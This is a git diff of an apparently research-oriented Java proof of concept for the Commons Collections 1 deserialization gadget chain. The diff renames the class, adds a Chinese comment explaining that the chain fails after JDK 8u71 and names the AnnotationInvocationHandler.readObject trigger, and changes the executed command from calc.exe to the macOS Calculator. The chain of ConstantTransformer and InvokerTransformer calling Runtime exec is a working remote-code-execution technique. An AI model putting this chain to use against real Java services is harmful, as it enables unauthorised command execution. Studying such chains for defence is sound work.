@@ -1,4 +1,4 @@
-package com.SugarP1g.deserialization.CommonsCollections;
+package com.SugarP1g.deserialization.CommonsCollections.CommonCollections1;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -17,7 +17,14 @@ import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CC1Before8u71 {
+/**
+ * 在Java 8u71以后的版本中该POC无法使用。因为在8u71版本以后，官方修改了AnnotationInvocationHandler类readobject函数实现。
+ * 不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。
+ *
+ * 本地测试JDK版本: 8u66
+ * 反序列化触发点: sun.reflect.annotation.AnnotationInvocationHandler: readObject
+ */
+public class PocWithLazyMap {
     public static void main(String[] args) throws Exception {
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
@@ -46,7 +53,7 @@ public class CC1Before8u71 {
                 new InvokerTransformer(
                         "exec",
                         new Class[]{String.class},
-                        new String[]{"calc.exe"}
+                        new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}
                 ),
         };
         Transformer transformerChain = new
